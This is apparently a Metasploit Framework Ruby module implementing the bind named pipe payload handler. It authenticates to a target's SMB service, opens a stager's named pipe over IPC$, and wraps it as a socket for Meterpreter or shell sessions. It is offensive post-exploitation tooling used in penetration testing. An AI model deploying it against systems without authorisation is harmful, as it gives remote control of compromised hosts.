# -*- coding: binary -*-
require 'thread'
require 'msf/core/post_mixin'
require 'rex/proto/smb/simpleclient'

#
# KNOWN ISSUES
#
# 1) A peek named pipe operation is carried out before every read to prevent blocking. This
#    generates extra traffic. SMB echo requests are also generated to force the packet
#    dispatcher to perform a read.
# 2) SMB1 only. Switch to ruby_smb.
#

#
# Socket interface for named pipes. Because of the way named pipes work, reads and writes
# each require both a sock.send (read/write request) and a sock.recv (read/write response).
# So, pipe.read and pipe.write need to be synchronized so the responses arent mixed up.
#
# The packet dispatcher calls select on the socket to check for packets to read. This is
# an issue when there are multiple writes since it will cause select to return which
# triggers a read, but there is nothing to read since the pipe will already have read
# the response. This read will then hold the mutex while the socket read waits to timeout.
# A peek operation on the pipe fixes this.
#
class OpenPipeSock < Rex::Proto::SMB::SimpleClient::OpenPipe
  attr_accessor :mutex, :last_comm, :write_queue, :write_thread, :read_buff, :echo_thread, :simple, :server_max_buffer_size

  STATUS_BUFFER_OVERFLOW = 0x80000005
  STATUS_PIPE_BROKEN     = 0xc000014b

  def initialize(*args, simple:, server_max_buffer_size:)
    super(*args)
    self.simple = simple
    self.client = simple.client
    self.mutex = Mutex.new      # synchronize read/writes
    self.last_comm = Time.now   # last successfull read/write
    self.write_queue = Queue.new # messages to send
    self.write_thread = Thread.new { dispatcher }
    self.echo_thread = Thread.new { force_read }
    self.read_buff = ''
    self.server_max_buffer_size = server_max_buffer_size # max transaction size
    self.chunk_size = server_max_buffer_size - 260       # max read/write size
  end

  # Check if there are any bytes to read and return number available. Access must be synchronized.
  def peek_named_pipe
    # 0x23 is the PeekNamedPipe operation. Last 16 bits is our pipes file id (FID).
    setup = [0x23, self.file_id].pack('vv')
    # Must ignore errors since we expect STATUS_BUFFER_OVERFLOW
    pkt = self.client.trans_maxzero('\\PIPE\\', '', '', 2, setup, false, true, true)
    if pkt['Payload']['SMB'].v['ErrorClass'] == STATUS_PIPE_BROKEN
      raise IOError
    end
    avail = 0
    begin
      avail = pkt.to_s[pkt['Payload'].v['ParamOffset']+4, 2].unpack('v')[0]
      self.last_comm = Time.now
    rescue
    end

    if (avail == 0) and (pkt['Payload']['SMB'].v['ErrorClass'] == STATUS_BUFFER_OVERFLOW)
      avail = self.client.default_max_buffer_size
    end

    avail
  end

  # Send echo request to force select() to return in the packet dispatcher and read from the socket.
  # This allows "channel -i" and "shell" to work.
  def force_read
    wait = 0.5                  # smaller is faster but generates more traffic
    while true
      elapsed = Time.now - self.last_comm
      if elapsed > wait
        self.mutex.synchronize do
          self.client.echo()
          self.last_comm = Time.now
        end
      else
        Rex::ThreadSafe.sleep(wait-elapsed)
      end
    end
  end

  # Runs as a thread and synchronizes writes. Allows write operations to return
  # immediately instead of waiting for the mutex.
  def dispatcher
    while not self.write_queue.closed?
      data = self.write_queue.pop
      self.mutex.synchronize do
        sent = 0
        while sent < data.length
          count = [self.chunk_size, data.length-sent].min
          buf = data[sent, count]
          Rex::Proto::SMB::SimpleClient::OpenPipe.instance_method(:write).bind(self).call(buf)
          self.last_comm = Time.now
          sent += count
        end
      end
    end
  end

  # Intercepts the socket.close from the session manager when the session dies.
  # Cleanly terminates the SMB session and closes the socket.
  def close
    self.echo_thread.kill rescue nil
    # Give the meterpreter shutdown command a chance
    self.write_queue.close
    begin
      if self.write_thread.join(2.0)
        self.write_thread.kill
      end
    rescue
    end

    # close pipe, share, and socket
    super rescue nil
    self.simple.disconnect(self.simple.last_share) rescue nil
    self.client.socket.close
  end

  def read(count)
    data = ''
    if count > self.read_buff.length
      # need more data to satisfy request
      self.mutex.synchronize do
        avail = peek_named_pipe
        if avail > 0
          left = [count-self.read_buff.length, avail].max
          while left > 0
            buff = super([left, self.chunk_size].min)
            self.last_comm = Time.now
            left -= buff.length
            self.read_buff += buff
          end
        end
      end
    end

    data = self.read_buff[0, [count, self.read_buff.length].min]
    self.read_buff = self.read_buff[data.length..-1]

    if data.length == 0
      # avoid full throttle polling
      Rex::ThreadSafe.sleep(0.2)
    end
    data
  end

  def put (data)
    write(data)
  end

  def write (data)
    self.write_queue.push(data)
    data.length
  end

  #
  # The session manager expects a socket object so we must implement
  # fd, localinfo, and peerinfo. fd is passed to select while localinfo
  # and peerinfo are used to report the addresses and ports of the
  # connection.
  #
  def fd
    self.client.socket.fd
  end

  def localinfo
    self.client.socket.localinfo
  end

  def peerinfo
    self.client.socket.peerinfo
  end

end

#
# SimpleClient for named pipe comms. Uses OpenPipe wrapper to provide
# a socket interface required by the packet dispatcher.
#
class SimpleClientPipe < Rex::Proto::SMB::SimpleClient
  attr_accessor :pipe

  def initialize(*args)
    super(*args)
    self.pipe = nil
  end

  # Copy of SimpleClient.create_pipe except OpenPipeSock is used instead of OpenPipe.
  # This is because we need to implement our own read/write.
  def create_pipe(path)
    pkt = self.client.create_pipe(path, Rex::Proto::SMB::Constants::CREATE_ACCESS_EXIST)
    file_id = pkt['Payload'].v['FileID']
    versions = [1]              # requires rex so SMB1 only
    self.pipe = OpenPipeSock.new(self.client, path, self.client.last_tree_id, file_id, versions, simple: self,
                                 server_max_buffer_size: self.server_max_buffer_size)
  end
end

module Msf
  module Handler
    module BindNamedPipe

      include Msf::Handler

      #
      # Returns the string representation of the handler type, in this case
      # 'bind_named_pipe'.
      #
      def self.handler_type
        "bind_named_pipe"
      end

      #
      # Returns the connection-described general handler type, in this case
      # 'bind'.
      #
      def self.general_handler_type
        "bind"
      end

      #
      # Initializes the handler and ads the options that are required for
      # bind named pipe payloads.
      #
      def initialize(info={})
        super

        register_options(
          [
            OptString.new('PIPENAME', [true, 'Name of the pipe to connect to', 'msf-pipe']),
            OptString.new('RHOST', [false, 'Host of the pipe to connect to', '']),
            OptPort.new('LPORT', [true, 'SMB port', 445]),
            OptString.new('SMBUser', [false, 'The username to authenticate as', '']),
            OptString.new('SMBPass', [false, 'The password for the specified username', '']),
            OptString.new('SMBDomain', [false, 'The Windows domain to use for authentication', '.']),
          ], Msf::Handler::BindNamedPipe)
        register_advanced_options(
          [
            OptString.new('SMBDirect', [true, 'The target port is a raw SMB service (not NetBIOS)', true]),
          ], Msf::Handler::BindNamedPipe)

        self.conn_threads = []
        self.listener_threads = []
      end

      # A string suitable for displaying to the user
      #
      # @return [String]
      def human_name
        "bind named pipe"
      end

      #
      # Starts monitoring for an inbound connection.
      #
      def start_handler
        # Maximum number of seconds to run the handler
        ctimeout = 150

        if (exploit_config and exploit_config['active_timeout'])
          ctimeout = exploit_config['active_timeout'].to_i
        end

        # Take a copy of the datastore options
        rhost = datastore['RHOST']
        lport = datastore['LPORT'].to_i
        pipe_name = datastore['PIPENAME']
        smbuser = datastore['SMBUser']
        smbpass = datastore['SMBPass']
        smbdomain = datastore['SMBDomain']
        smbdirect = datastore['SMBDirect']
        smbshare = "\\\\#{rhost}\\IPC$"

        # Ignore this if one of the required options is missing
        return if not rhost
        return if not lport

        # Start a new handling thread
        self.listener_threads << framework.threads.spawn("BindNamedPipeHandlerListener-#{pipe_name}", false) {
          sock = nil
          print_status("Started #{human_name} handler against #{rhost}:#{lport}")

          # First, create a socket and connect to the SMB service
          begin
            sock = Rex::Socket::Tcp.create(
              'PeerHost' => rhost,
              'PeerPort' => lport.to_i,
              'Proxies'  => datastore['Proxies'],
              'Context'  =>
              {
                'Msf'        => framework,
                'MsfPayload' => self,
                'MsfExploit' => assoc_exploit
              })
          rescue Rex::ConnectionError => e
            vprint_error(e.message)
          rescue
            wlog("Exception caught in bind handler: #{$!.class} #{$!}")
          end

          if not sock
            print_error("Failed to connect socket #{rhost}:#{lport}")
            exit
          end

          # Perform SMB logon
          simple = SimpleClientPipe.new(sock, smbdirect)

          begin
            simple.login('*SMBSERVER', smbuser, smbpass, smbdomain)
            vprint_status("SMB login Success #{smbdomain}\\#{smbuser}:#{smbpass} #{rhost}:#{lport}")
          rescue
            print_error("SMB login Failure #{smbdomain}\\#{smbuser}:#{smbpass} #{rhost}:#{lport}")
            exit
          end

          # Connect to the IPC$ share so we can use named pipes.
          simple.connect(smbshare)
          vprint_status("Connected to #{smbshare}")

          # Make several attempts to connect to the stagers named pipe. Authenticating and
          # connecting to IPC$ should be possible pre stager so we only retry this operation.
          # The stager creates the pipe with a default ACL which provides r/w to the creator
          # and administrators.
          stime = Time.now.to_i
          while (stime + ctimeout > Time.now.to_i)
            begin
              pipe = simple.create_pipe("\\"+pipe_name)
            rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
              error_name = e.get_error(e.error_code)
              unless ['STATUS_OBJECT_NAME_NOT_FOUND', 'STATUS_PIPE_NOT_AVAILABLE'].include? error_name
                print_error("Error connecting to #{pipe_name}: #{error_name}")
                exit
              end
              Rex::ThreadSafe.sleep(1.0)
            end
            break if pipe
          end

          if not pipe
            print_error("Failed to connect to pipe \\#{pipe_name} on #{rhost}")
            exit
          end

          vprint_status("Opened pipe \\#{pipe_name}")

          # Increment the has connection counter
          self.pending_connections += 1

          # Timeout and datastore options need to be passed through to the client
          opts = {
            :datastore    => datastore,
            :expiration   => datastore['SessionExpirationTimeout'].to_i,
            :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
            :retry_total  => datastore['SessionRetryTotal'].to_i,
            :retry_wait   => datastore['SessionRetryWait'].to_i
          }

          conn_threads << framework.threads.spawn("BindNamedPipeHandlerSession", false, simple) { |simple_copy|
            begin
              session = handle_connection(simple_copy.pipe, opts)
            rescue => e
              elog("Exception raised from BindNamedPipe.handle_connection: #{$!}")
            end
          }
        }
      end

      #
      # Stop
      #
      def stop_handler
        self.listener_threads.each do |t|
          t.kill
        end
        self.listener_threads = []
      end

      #
      # Cleanup
      #
      def cleanup_handler
        self.conn_threads.each { |t|
          t.kill
        }
      end

      protected

      attr_accessor :conn_threads
      attr_accessor :listener_threads

    end
  end
end
